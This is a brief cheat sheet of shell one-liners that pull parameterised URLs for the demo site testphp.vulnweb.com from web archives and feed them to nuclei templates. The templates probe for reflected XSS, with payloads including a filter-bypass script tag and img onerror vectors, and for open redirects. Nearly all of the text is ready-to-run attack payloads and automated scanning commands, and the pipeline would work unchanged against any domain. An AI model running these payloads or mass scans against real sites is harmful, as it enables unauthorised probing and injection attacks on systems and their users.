## NUCLEI AUTOMATION TEMPLATES


**XSS ONE-LINER PAYLOAD `</script><scr<script>ipt>confirm(1)</scr</script>ipt>`**
```
waybackurls testphp.vulnweb.com | grep "=" | sed 's/=.*/=/' | anew | uro | nuclei -t ~/tools/templates/xss-script.yaml
```

**XSS ONE-LINER PAYLOAD `<img src=x onerror=confirm(1)>`**
```
waybackurls testphp.vulnweb.com | grep "=" | sed 's/=.*/=/' | anew | uro | nuclei -t ~/tools/templates/xss-img.yaml
```

**XSS ONE-LINER PAYLOAD `<image/src/onerror=confirm(1)>`**
```
waybackurls testphp.vulnweb.com | grep "=" | sed 's/=.*/=/' | anew | uro | nuclei -t ~/tools/templates/xss-image.yaml
```


**OPENREDIRECT ONE-LINER**
```
waybackurls testphp.vulnweb.com | grep "=" | sed 's/=.*/=/' | anew | uro | nuclei -t ~/tools/templates/openredirect-checker.yaml
```
